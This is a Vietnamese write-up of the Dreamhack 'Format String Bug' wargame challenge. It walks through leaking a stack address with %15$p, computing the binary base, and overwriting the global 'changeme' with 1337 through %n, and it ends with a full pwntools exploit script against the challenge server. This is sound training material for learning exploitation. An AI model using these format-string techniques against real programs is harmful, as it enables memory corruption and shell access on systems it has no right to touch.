# Link bài trên Dreamhack:
[Format String Bug](https://dreamhack.io/wargame/challenges/356)

# Phân tích code

<img width="1277" height="782" alt="image" src="https://github.com/user-attachments/assets/b01fb965-b0ad-4434-adfa-469db3da9d5c" />

<br><br>

Để tạo shell thì ta cần đặt biến toàn cục changeme thành giá trị 1337. Trong chương trình chỉ có lỗ hổng format string. 
Để ghi đè giá trị 1337 lên changeme ta cần biết địa chỉ của changeme trước.

Hãy kiểm tra xem ta có thể leak được gì trên Stack:

<br><br>

<img width="1241" height="367" alt="Screenshot 2026-10-07 230030" src="https://github.com/user-attachments/assets/4e28e02f-5173-4d82-8a86-9b0baa8fd484" />

<br><br>

Trước mắt thì trong Stack có 1 địa chỉ binary có thể được leak qua `%s`. Nhưng khoan. Chúng ta đang xem Stack trong local, kết cấu Stack trong server có thể khác hoàn toàn. Hãy chạy chương trình trên server để kiểm tra điều này.

build, run docker rồi dùng docker ps để lấy CONTAINER ID.

<br><br>

<img width="1816" height="80" alt="image" src="https://github.com/user-attachments/assets/057ed894-ae22-4f66-982b-25b74820a6e1" />

<br><br>

Bây giờ thì sử dụng CONTAINER ID để tìm file libc.so.6
<br><br>

<img width="1397" height="352" alt="image" src="https://github.com/user-attachments/assets/b6709f6e-23b8-4163-8020-330965a20b13" />

<br><br>

sau khi đã patch xong file binary và libc.so.6 thì hãy kiểm tra lại Stack:

<br><br>

<img width="1272" height="442" alt="Screenshot 2026-10-08 004408" src="https://github.com/user-attachments/assets/3227faf2-aa24-41f4-87b2-7a978ee213f1" />

<br><br>

Ta có thể thấy trong Stack của server khác hoàn toàn của local và chúng ta muốn script hoạt động trên server.
Vậy chúng ta sẽ leak địa chỉ binary `0x555555555293` để tính base address.
Tính khoảng cách từ nơi chứa địa chỉ binary đến rsp cộng thêm 5 register là 15%

Leak binary: 

    p.send(b'%15$p')
    leak_binary=int(p.recvline(),16)
    exe.address=leak_binary-0x1293      //trừ đi offset đến base address
    leak_changeme=exe.address+0x401c    //cộng thêm offset từ base address đến biến changeme

Sau đó ta dùng `%n` để ghi đè giá trị lên biến changeme qua địa chỉ vừa leak:

    payload=b'%1337c'+b'%8$naaaaaa'
    payload+=p64(leak_changeme)
    p.send(payload)

# Script Python

    #!/usr/bin/env python3
    from pwn import *
    exe=ELF('./fsb_overwrite_patched',checksec=False)
    #p=process(exe.path)
    p=remote('host3.dreamhack.games',22525)
    
    p.send(b'%15$p')
    leak_binary=int(p.recvline(),16)
    exe.address=leak_binary-0x1293
    leak_changeme=exe.address+0x401c
    log.info('leak_binary: '+hex(leak_binary))
    log.info('exe.addr: '+hex(exe.address))
    log.info('changeme: '+hex(leak_changeme))
    
    payload=b'%1337c'+b'%8$naaaaaa'
    payload+=p64(leak_changeme)
    p.send(payload)
    
    p.interactive()



